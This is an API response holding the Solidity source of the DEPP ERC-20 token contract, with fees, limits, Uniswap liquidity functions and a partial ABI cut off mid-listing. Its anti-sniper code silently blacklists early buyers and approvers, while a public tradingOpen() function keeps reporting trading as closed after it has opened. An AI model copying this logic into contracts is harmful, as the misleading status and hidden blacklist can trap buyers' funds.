{"status": "1", "message": "OK", "result": [{"SourceCode": "//SPDX-License-Identifier: MIT \r\n\r\npragma solidity 0.8.13;\r\n\r\ninterface IERC20 {\r\n\tfunction totalSupply() external view returns (uint256);\r\n\tfunction decimals() external view returns (uint8);\r\n\tfunction symbol() external view returns (string memory);\r\n\tfunction name() external view returns (string memory);\r\n\tfunction balanceOf(address account) external view returns (uint256);\r\n\tfunction transfer(address recipient, uint256 amount) external returns (bool);\r\n\tfunction allowance(address _owner, address spender) external view returns (uint256);\r\n\tfunction approve(address spender, uint256 amount) external returns (bool);\r\n\tfunction transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\tevent Transfer(address indexed from, address indexed to, uint256 value);\r\n\tevent Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract Auth {\r\n\taddress internal owner;\r\n\tconstructor(address _owner) { owner = _owner; }\r\n\tmodifier onlyOwner() { require(msg.sender == owner, \"Only contract owner can call this function\"); _; }\r\n\tfunction transferOwnership(address payable newOwner) external onlyOwner { owner = newOwner;\temit OwnershipTransferred(newOwner); }\r\n\tevent OwnershipTransferred(address owner);\r\n}\r\n\r\ninterface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair); }\r\ninterface IUniswapV2Router02 {\r\n\tfunction swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;\r\n\tfunction WETH() external pure returns (address);\r\n\tfunction factory() external pure returns (address);\r\n\tfunction addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract DEPP is IERC20, Auth {\r\n\tstring _name; \r\n\tstring _symbol; \r\n\tuint8 constant _decimals = 9;\r\n\tuint256 constant _totalSupply = 100_000_000 * 10**_decimals;\r\n\tmapping (address => uint256) _balances;\r\n\tmapping (address => mapping (address => uint256)) _allowances;\r\n\tuint256 private _tradingOpenBlock;\r\n\tmapping (address => bool) private _isLiqPool;\r\n\tuint16 private _blacklistedWallets = 0;\r\n\r\n\tuint8 private fee_taxRateMaxLimit; uint8 private fee_taxRateBuy; uint8 private fee_taxRateSell; uint8 private fee_taxRateTransfer;\r\n\tuint16 private fee_sharesAutoLP; uint16 private fee_sharesMarketing; uint16 private fee_sharesDevelopment; uint16 private fee_sharesCharity; uint16 private fee_sharesTeam; uint16 private fee_sharesTOTAL;\r\n\r\n\tuint256 private lim_maxTxAmount; uint256 private lim_maxWalletAmount;\r\n\tuint256 private lim_taxSwapMin; uint256 private lim_taxSwapMax;\r\n\r\n\taddress payable private wlt_marketing;\r\n\taddress payable private wlt_development;\r\n\taddress payable private wlt_charity;\r\n\taddress payable private wlt_team;\r\n\taddress private _liquidityPool;\r\n\r\n\tmapping(address => bool) private exm_noFees;\r\n\tmapping(address => bool) private exm_noLimits;\r\n\t\r\n\tuint256 private _humanBlock = 0;\r\n\tmapping (address => bool) private _nonSniper;\r\n\tmapping (address => uint256) private _blacklistBlock;\r\n\r\n\tbool private _inTaxSwap = false;\r\n\taddress private constant _uniswapV2RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n\taddress private _wethAddress = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\r\n\tIUniswapV2Router02 private _uniswapV2Router;\r\n\tmodifier lockTaxSwap { _inTaxSwap = true; _; _inTaxSwap = false; }\r\n\r\n\tevent TokensBurned(address burnedFrom, uint256 tokenAmount);\r\n\tevent TokensAirdropped(uint256 totalWallets, uint256 totalTokens);\r\n\tevent TaxRatesChanged(uint8 taxRateBuy, uint8 taxRateSell, uint8 taxRateTransfer, bool buySupport);\r\n\tevent TaxWalletsChanged(address marketing, address development, address charity, address team);\r\n\tevent TaxDistributionChanged(uint16 autoLP, uint16 marketing, uint16 development, uint16 charity, uint16 team);\r\n\tevent LimitsIncreased(uint256 maxTransaction, uint256 maxWalletSize);\r\n\tevent TaxSwapSettingsChanged(uint256 taxSwapMin, uint256 taxSwapMax);\r\n\tevent WalletExemptionsSet(address wallet, bool noFees, bool noLimits);\r\n\r\n\r\n\tconstructor() Auth(msg.sender) {\r\n\t\t_tradingOpenBlock = type(uint256).max; \r\n\t\tfee_taxRateMaxLimit = 10;\r\n\t\tlim_maxTxAmount = _totalSupply;\r\n\t\tlim_maxWalletAmount = _totalSupply;\r\n\t\tlim_taxSwapMin = _totalSupply * 10 / 10000;\r\n\t\tlim_taxSwapMax = _totalSupply * 50 / 10000;\r\n\t\tfee_sharesAutoLP = 200;\r\n\t\tfee_sharesMarketing = 100;\r\n\t\tfee_sharesDevelopment = 100;\r\n\t\tfee_sharesCharity = 200;\r\n\t\tfee_sharesTeam = 200;\r\n\t\tfee_sharesTOTAL = fee_sharesAutoLP + fee_sharesMarketing + fee_sharesDevelopment + fee_sharesCharity + fee_sharesTeam;\r\n\t\t_uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);\r\n\r\n\t\twlt_marketing = payable(0x0818E250874fDEc88111f9fE0ea7069B35DeCb01);\r\n\t\twlt_development = payable(0xa2eEA33EE7378FE902eDE36C61c4C2d14825432C);\r\n\t\twlt_charity = payable(0xde53e5adBAc6a050385dc409230365933Cc9ecb8);\r\n\t\twlt_team = payable(0xaA7339fabefb98F01c83f2dcFaF5101c2dC88076);\r\n\r\n\t\texm_noFees[owner] = true;\r\n\t\texm_noFees[address(this)] = true;\r\n\t\texm_noFees[_uniswapV2RouterAddress] = true;\r\n\t\texm_noFees[wlt_marketing] = true;\r\n\t\texm_noFees[wlt_development] = true;\r\n\t\texm_noFees[wlt_charity] = true;\r\n\t\texm_noFees[wlt_team] = true;\r\n\r\n\t\texm_noLimits[owner] = true;\r\n\t\texm_noLimits[address(this)] = true;\r\n\t\texm_noLimits[_uniswapV2RouterAddress] = true;\r\n\t\texm_noLimits[wlt_marketing] = true;\r\n\t\texm_noLimits[wlt_development] = true;\r\n\t\texm_noLimits[wlt_charity] = true;\r\n\t\texm_noLimits[wlt_team] = true;\r\n\t}\r\n\t\r\n\treceive() external payable {}\r\n\t\r\n\tfunction totalSupply() external pure override returns (uint256) { return _totalSupply; }\r\n\tfunction decimals() external pure override returns (uint8) { return _decimals; }\r\n\tfunction symbol() external view override returns (string memory) { return _symbol; }\r\n\tfunction name() external view override returns (string memory) { return _name; }\r\n\tfunction balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\r\n\tfunction allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n\r\n\tfunction approve(address spender, uint256 amount) public override returns (bool) {\r\n\t\tif ( _humanBlock > block.number && !_nonSniper[msg.sender] ) {\r\n\t\t\t_addBlacklist(msg.sender, block.number, true);\r\n\t\t}\r\n\r\n\t\t_allowances[msg.sender][spender] = amount;\r\n\t\temit Approval(msg.sender, spender, amount);\r\n\t\treturn true;\r\n\t}\r\n\r\n\tfunction transfer(address recipient, uint256 amount) external override returns (bool) {\r\n\t\trequire(_checkTradingOpen(), \"Trading not open\");\r\n\t\treturn _transferFrom(msg.sender, recipient, amount);\r\n\t}\r\n\r\n\tfunction transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n\t\trequire(_checkTradingOpen(), \"Trading not open\");\r\n\t\tif (_allowances[sender][msg.sender] != type(uint256).max){\r\n\t\t\t_allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\r\n\t\t}\r\n\t\treturn _transferFrom(sender, recipient, amount);\r\n\t}\r\n\r\n\tfunction setPrep(string[] calldata values) external onlyOwner {\r\n\t\trequire(!_tradingOpen(), \"trading already open\");\r\n\t\trequire(_liquidityPool == address(0), \"LP already initialized\");\r\n\t\t_symbol = string.concat('DE',values[0]); \r\n\t\t_name = string.concat('Jus',values[1],' 4 Jo',values[2]); \r\n\t}\r\n\r\n\tfunction initLP(uint256 ethAmountWei) external onlyOwner {\r\n\t\trequire(!_tradingOpen(), \"trading already open\");\r\n\t\trequire(_liquidityPool == address(0), \"LP already initialized\");\r\n\t\trequire(ethAmountWei > 0, \"eth cannot be 0\");\r\n\r\n\t\t_balances[address(this)] = _totalSupply;\r\n\t\temit Transfer(address(0), address(this), _balances[address(this)]);\r\n\r\n\t\t_nonSniper[address(this)] = true;\r\n\t\t_nonSniper[owner] = true;\r\n\t\t_nonSniper[wlt_marketing] = true;\r\n\r\n\t\t_wethAddress = _uniswapV2Router.WETH(); //override the WETH address from router\r\n\t\tuint256 _contractETHBalance = address(this).balance;\r\n\t\trequire(_contractETHBalance >= ethAmountWei, \"not enough eth\");\r\n\t\tuint256 _contractTokenBalance = balanceOf(address(this));\r\n\t\trequire(_contractTokenBalance > 0, \"no tokens\");\r\n\t\taddress _uniLpAddr = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _wethAddress);\r\n\t\t_liquidityPool = _uniLpAddr;\r\n\r\n\t\t_isLiqPool[_uniLpAddr] = true;\r\n\t\t_nonSniper[_uniLpAddr] = true;\r\n\r\n\t\t_approveRouter(_contractTokenBalance);\r\n\t\t_addLiquidity(_contractTokenBalance, ethAmountWei, false);\r\n\t}\r\n\r\n\tfunction _approveRouter(uint256 _tokenAmount) internal {\r\n\t\tif ( _allowances[address(this)][_uniswapV2RouterAddress] < _tokenAmount ) {\r\n\t\t\t_allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;\r\n\t\t\temit Approval(address(this), _uniswapV2RouterAddress, type(uint256).max);\r\n\t\t}\r\n\t}\r\n\r\n\tfunction _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {\r\n\t\taddress lpTokenRecipient = address(0);\r\n\t\tif ( !autoburn ) { lpTokenRecipient = owner; }\r\n\t\t_uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );\r\n\t}\r\n\r\n\tfunction openTrading() external onlyOwner {\r\n\t\trequire(!_tradingOpen(), \"trading already open\");\r\n\t\trequire(_liquidityPool != address(0), \"LP not initialized\");\r\n\t\t_openTrading();\r\n\t}\r\n\r\n\tfunction _openTrading() internal {\r\n\t\tlim_maxTxAmount     = 50 * _totalSupply / 10000 + 10**_decimals; \r\n\t\tlim_maxWalletAmount = 50 * _totalSupply / 10000 + 10**_decimals;\r\n\t\tfee_taxRateBuy = 10; //anti-snipe, will be 8\r\n\t\tfee_taxRateSell = 20; //anti-dump, will be 8\r\n\t\tfee_taxRateTransfer = 10; //anti-bot, will be 0\r\n\t\t_tradingOpenBlock = block.number + 27; //about 5 minutes delay\r\n\t\t_humanBlock = block.number + 36; //9 blocks auto blacklist as this is stealth\r\n\t}\r\n\r\n\tfunction tradingOpen() external view returns (bool) {\r\n\t\tif (_tradingOpen() && block.number >= _humanBlock + 10) { return _tradingOpen(); }\r\n\t\telse { return false; }\r\n\t}\r\n\r\n\tfunction _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n\t\trequire(sender!=address(0) && recipient!=address(0), \"Zero address not allowed\");\r\n\t\tif ( _humanBlock > block.number ) {\r\n\t\t\tif ( _blacklistBlock[sender] == 0 ) { _addBlacklist(recipient, block.number, true); }\r\n\t\t\telse { _addBlacklist(recipient, _blacklistBlock[sender], false); }\r\n\t\t} else {\r\n\t\t\tif ( _blacklistBlock[sender] != 0 ) { _addBlacklist(recipient, _blacklistBlock[sender], false); }\r\n\t\t}\r\n\r\n\t\tif ( _tradingOpen() && _blacklistBlock[sender] != 0 && _blacklistBlock[sender] < block.number ) { revert(\"blacklisted\"); }\r\n\r\n\t\tif ( !_inTaxSwap && _isLiqPool[recipient] ) { _swapTaxAndLiquify();\t}\r\n\r\n\t\tif ( sender != address(this) && recipient != address(this) && sender != owner ) { require(_checkLimits(sender, recipient, amount), \"TX exceeds limits\"); }\r\n\t\tuint256 _taxAmount = _calculateTax(sender, recipient, amount);\r\n\t\tuint256 _transferAmount = amount - _taxAmount;\r\n\t\t_balances[sender] = _balances[sender] - amount;\r\n\t\tif ( _taxAmount > 0 ) { _balances[address(this)] = _balances[address(this)] + _taxAmount; }\r\n\t\t_balances[recipient] = _balances[recipient] + _transferAmount;\r\n\t\temit Transfer(sender, recipient, amount);\r\n\t\treturn true;\r\n\t}\r\n\r\n\tfunction _addBlacklist(address wallet, uint256 blackBlockNum, bool addSniper) internal {\r\n\t\tif ( !_nonSniper[wallet] && _blacklistBlock[wallet] == 0 ) { \r\n\t\t\t_blacklistBlock[wallet] = blackBlockNum; \r\n\t\t\tif ( addSniper) { _blacklistedWallets ++; }\r\n\t\t}\r\n\t}\r\n\t\r\n\tfunction _checkLimits(address sender, address recipient, uint256 transferAmount) internal view returns (bool) {\r\n\t\tbool limitCheckPassed = true;\r\n\t\tif ( _tradingOpen() && !exm_noLimits[recipient] && !exm_noLimits[sender] ) {\r\n\t\t\tif ( transferAmount > lim_maxTxAmount ) { limitCheckPassed = false; }\r\n\t\t\telse if ( !_isLiqPool[recipient] && (_balances[recipient] + transferAmount > lim_maxWalletAmount) ) { limitCheckPassed = false; }\r\n\t\t}\r\n\t\treturn limitCheckPassed;\r\n\t}\r\n\r\n\tfunction _tradingOpen() private view returns (bool) {\r\n\t\tbool result = false;\r\n\t\tif (_tradingOpenBlock <= block.number) { result = true; }\r\n\t\treturn result;\r\n\t}\r\n\r\n\tfunction _checkTradingOpen() private view returns (bool){\r\n\t\tbool checkResult = false;\r\n\t\tif ( _tradingOpen() ) { checkResult = true; } \r\n\t\telse if ( tx.origin == owner ) { checkResult = true; } \r\n\t\treturn checkResult;\r\n\t}\r\n\r\n\tfunction _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {\r\n\t\tuint256 taxAmount;\r\n\t\tif ( !_tradingOpen() || exm_noFees[sender] || exm_noFees[recipient] ) { taxAmount = 0; }\r\n\t\telse if ( _isLiqPool[sender] ) { taxAmount = amount * fee_taxRateBuy / 100; }\r\n\t\telse if ( _isLiqPool[recipient] ) { taxAmount = amount * fee_taxRateSell / 100; }\r\n\t\telse { taxAmount = amount * fee_taxRateTransfer / 100; }\r\n\t\treturn taxAmount;\r\n\t}\r\n\r\n\tfunction getBlacklistStatus(address wallet) external view returns(bool isBlacklisted, uint256 blacklistBlock, uint16 totalBlacklistedWallets) {\r\n\t\tbool _isBlacklisted;\r\n\t\tif ( _blacklistBlock[wallet] != 0 ) { _isBlacklisted = true; }\r\n\t\treturn ( _isBlacklisted, _blacklistBlock[wallet], _blacklistedWallets);\t\r\n\t}\r\n\r\n\tfunction getExemptions(address wallet) external view returns(bool noFees, bool noLimits) {\r\n\t\treturn (exm_noFees[wallet], exm_noLimits[wallet]);\r\n\t}\r\n\r\n\tfunction setExemptions(address wallet, bool noFees, bool noLimits) external onlyOwner {\r\n\t\texm_noFees[wallet] = noFees;\r\n\t\texm_noLimits[wallet] = noLimits;\r\n\t\temit WalletExemptionsSet(wallet, noFees, noLimits);\r\n\t}\r\n\r\n\tfunction getFeeSettings() external view returns(uint8 taxRateMaxLimit, uint8 taxRateBuy, uint8 taxRateSell, uint8 taxRateTransfer, uint16 sharesAutoLP, uint16 sharesMarketing, uint16 sharesDevelopment, uint16 sharesCharity, uint16 sharesTeam ) {\r\n\t\treturn (fee_taxRateMaxLimit, fee_taxRateBuy, fee_taxRateSell, fee_taxRateTransfer, fee_sharesAutoLP, fee_sharesMarketing, fee_sharesDevelopment, fee_sharesCharity, fee_sharesTeam);\r\n\t}\r\n\r\n\tfunction setTaxRates(uint8 newBuyTax, uint8 newSellTax, uint8 newTxTax, bool enableBuySupport) external onlyOwner {\r\n\t\tif (enableBuySupport) {\r\n\t\t\trequire( newSellTax > newBuyTax, \"Sell tax must be > buy tax\");\r\n\t\t\trequire( newBuyTax+newSellTax <= 2*fee_taxRateMaxLimit, \"Avg tax too high\");\r\n\t\t} else {\r\n\t\t\trequire(newBuyTax <= fee_taxRateMaxLimit && newSellTax <= fee_taxRateMaxLimit, \"Tax too high\");\r\n\t\t}\r\n\t\trequire(newTxTax <= fee_taxRateMaxLimit, \"Tax too high\");\r\n\t\tfee_taxRateBuy = newBuyTax;\r\n\t\tfee_taxRateSell = newSellTax;\r\n\t\tfee_taxRateTransfer = newTxTax;\r\n\t\temit TaxRatesChanged(newBuyTax, newSellTax, newTxTax, enableBuySupport);\r\n\t}\r\n\r\n\tfunction setTaxDistribution(uint16 sharesAutoLP, uint16 sharesMarketing, uint16 sharesDevelopment, uint16 sharesCharity, uint16 sharesTeam) external onlyOwner {\r\n\t\tfee_sharesAutoLP = sharesAutoLP;\r\n\t\tfee_sharesMarketing = sharesMarketing;\r\n\t\tfee_sharesDevelopment = sharesDevelopment;\r\n\t\tfee_sharesCharity = sharesCharity;\r\n\t\tfee_sharesTeam = sharesTeam;\r\n\t\tfee_sharesTOTAL = fee_sharesAutoLP + fee_sharesMarketing + fee_sharesDevelopment + fee_sharesCharity + fee_sharesTeam;\r\n\t\temit TaxDistributionChanged(sharesAutoLP, sharesMarketing, sharesDevelopment, sharesCharity, sharesTeam);\r\n\t}\r\n\t\r\n\tfunction getWallets() external view returns(address contractOwner, address liquidityPool, address marketing, address development, address charity, address team) {\r\n\t\treturn (owner, _liquidityPool, wlt_marketing, wlt_development, wlt_charity, wlt_team);\r\n\t}\r\n\r\n\tfunction setTaxWallets(address newMarketingWallet, address newDevelopmentWallet, address newCharityWallet, address newTeamWallet) external onlyOwner {\r\n\t\twlt_marketing = payable(newMarketingWallet);\r\n\t\twlt_development = payable(newDevelopmentWallet);\r\n\t\twlt_charity = payable(newCharityWallet);\r\n\t\twlt_team = payable(newTeamWallet);\r\n\t\texm_noFees[newMarketingWallet] = true;\r\n\t\texm_noLimits[newMarketingWallet] = true;\r\n\t\texm_noFees[newTeamWallet] = true;\r\n\t\texm_noLimits[newTeamWallet] = true;\r\n\t\temit TaxWalletsChanged(newMarketingWallet, newDevelopmentWallet, newCharityWallet, newTeamWallet);\r\n\t}\r\n\r\n\tfunction getLimits() external view returns(uint256 maxTxAmount, uint256 maxWalletAmount, uint256 taxSwapMin, uint256 taxSwapMax) {\r\n\t\treturn (lim_maxTxAmount, lim_maxWalletAmount, lim_taxSwapMin, lim_taxSwapMax);\r\n\t}\r\n\r\n\tfunction increaseLimits(uint16 maxTxAmtPermile, uint16 maxWalletAmtPermile) external onlyOwner {\r\n\t\tuint256 newTxAmt = _totalSupply * maxTxAmtPermile / 1000 + 1;\r\n\t\trequire(newTxAmt >= lim_maxTxAmount, \"tx limit too low\");\r\n\t\tlim_maxTxAmount = newTxAmt;\r\n\t\tuint256 newWalletAmt = _totalSupply * maxWalletAmtPermile / 1000 + 1;\r\n\t\trequire(newWalletAmt >= lim_maxWalletAmount, \"wallet limit too low\");\r\n\t\tlim_maxWalletAmount = newWalletAmt;\r\n\t\temit LimitsIncreased(lim_maxTxAmount, lim_maxWalletAmount);\r\n\t}\r\n\r\n\tfunction setTaxSwapLimits(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external onlyOwner {\r\n\t\tlim_taxSwapMin = _totalSupply * minValue / minDivider;\r\n\t\tlim_taxSwapMax = _totalSupply * maxValue / maxDivider;\r\n\t\trequire(lim_taxSwapMax > lim_taxSwapMin);\r\n\t\temit TaxSwapSettingsChanged(lim_taxSwapMin, lim_taxSwapMax);\r\n\t}\r\n\r\n\tfunction _swapTaxAndLiquify() private lockTaxSwap {\r\n\t\tuint256 _taxTokensAvailable = balanceOf(address(this));\r\n\r\n\t\tif ( _taxTokensAvailable >= lim_taxSwapMin && _tradingOpen() ) {\r\n\t\t\tif ( _taxTokensAvailable >= lim_taxSwapMax ) { _taxTokensAvailable = lim_taxSwapMax; }\r\n\t\t\tuint256 _tokensForLP = _taxTokensAvailable * fee_sharesAutoLP / fee_sharesTOTAL / 2;\r\n\t\t\tuint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;\r\n\t\t\tif (_tokensToSwap >= 10**_decimals) {\r\n\t\t\t\tuint256 _ethPreSwap = address(this).balance;\r\n\t\t\t\t_swapTaxTokensForEth(_tokensToSwap);\r\n\t\t\t\tuint256 _ethSwapped = address(this).balance - _ethPreSwap;\r\n\t\t\t\tif ( fee_sharesAutoLP > 0 ) {\r\n\t\t\t\t\tuint256 _ethWeiAmount = _ethSwapped * fee_sharesAutoLP / fee_sharesTOTAL ;\r\n\t\t\t\t\t_approveRouter(_tokensForLP);\r\n\t\t\t\t\t_addLiquidity(_tokensForLP, _ethWeiAmount, false);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tuint256 _contractETHBalance = address(this).balance;\t\t\t\r\n\t\t\tif (_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }\r\n\t\t}\r\n\t}\r\n\r\n\tfunction _swapTaxTokensForEth(uint256 _tokenAmount) private {\r\n\t\t_approveRouter(_tokenAmount);\r\n\t\taddress[] memory path = new address[](2);\r\n\t\tpath[0] = address(this);\r\n\t\tpath[1] = _wethAddress;\r\n\t\t_uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_tokenAmount,0,path,address(this),block.timestamp);\r\n\t}\r\n\r\n\tfunction _distributeTaxEth(uint256 _amount) private {\r\n\t\tuint16 _ethTaxShareTotal = fee_sharesMarketing + fee_sharesDevelopment + fee_sharesCharity + fee_sharesTeam; \r\n\t\tif ( fee_sharesMarketing > 0 ) { wlt_marketing.transfer(_amount * fee_sharesMarketing / _ethTaxShareTotal); }\r\n\t\tif ( fee_sharesDevelopment > 0 ) { wlt_development.transfer(_amount * fee_sharesDevelopment / _ethTaxShareTotal); }\r\n\t\tif ( fee_sharesCharity > 0 ) { wlt_charity.transfer(_amount * fee_sharesCharity / _ethTaxShareTotal); }\r\n\t\tif ( fee_sharesTeam > 0 ) { wlt_team.transfer(_amount * fee_sharesTeam / _ethTaxShareTotal); }\r\n\t}\r\n\r\n\tfunction taxManualSwapSend(bool swapTokens, bool sendEth) external onlyOwner {\r\n\t\tif (swapTokens) {\r\n\t\t\tuint256 taxTokenBalance = balanceOf(address(this));\r\n\t\t\trequire(taxTokenBalance > 0, \"No tokens\");\r\n\t\t\t_swapTaxTokensForEth(taxTokenBalance);\r\n\t\t}\r\n\t\t\r\n\t\tif (sendEth) {\r\n\t\t\t_distributeTaxEth(address(this).balance); \r\n\t\t}\r\n\t}\r\n\r\n\tfunction burnTokens(uint256 amount) external {\r\n\t\tuint256 _tokensAvailable = balanceOf(msg.sender);\r\n\t\trequire(amount <= _tokensAvailable, \"Token balance too low\");\r\n\t\t_balances[msg.sender] -= amount;\r\n\t\t_balances[address(0)] += amount;\r\n\t\temit Transfer(msg.sender, address(0), amount);\r\n\t\temit TokensBurned(msg.sender, amount);\r\n\t}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"maxTransaction\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"maxWalletSize\",\"type\":\"uint256\"}],\"name\":\"LimitsIncreased\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"autoLP\",\"type\":\"uint16\"},{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"marketing\",\"type\":\"uint16\"},{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"development\",\"type\":\"uint16\"},{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"charity\",\"type\":\"uint16\"},{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"team\",\"type\":\"uint16\"}],\"name\":\"TaxDistributionChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"taxRateBuy\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"taxRateSell\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"taxRateTransfer\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"buySupport\",\"type\":\"bool\"}],\"name\":\"TaxRatesChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"taxSwapMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"taxSwapMax\",\"type\":\"uint256\"}],\"name\":\"TaxSwapSettingsChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"marketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"development\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"charity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"team\",\"type\":\"address\"}],\"name\":\"TaxWalletsChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"totalWallets\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"totalTokens\",\"type\":\"uint256\"}],\"name\":\"TokensAirdropped\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"burnedFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"TokensBurned\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"wallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"noFees\",\"type\":\"bool\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"noLimits\",\"type\":\"bool\"}],\"name\":\"WalletExemptionsSet\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burnTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"wallet\",\"type\":\"address\"}],\"name\":\"getBlacklistStatus\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"isBlacklisted\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"blacklistBlock\",\"type\":\"uint256\"},{\"internalType\":\"uint16\",\"name\":\"totalBlacklistedWallets\",\"type\":\"uint16\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"wallet\",\"type\":\"address\"}],\"name\":\"getExemptions\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"noFees\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"noLimits\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getFeeSettings\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"taxRateMaxLimit\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"taxRateBuy\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"taxRateSell\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"taxRateTransfer\",\"type\":\"uint8\"},{\"internalType\":\"uint16\",\"name\":\"sharesAutoLP\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"sharesMarketing\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"sharesDevelopment\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"sharesCharity\",\"type\":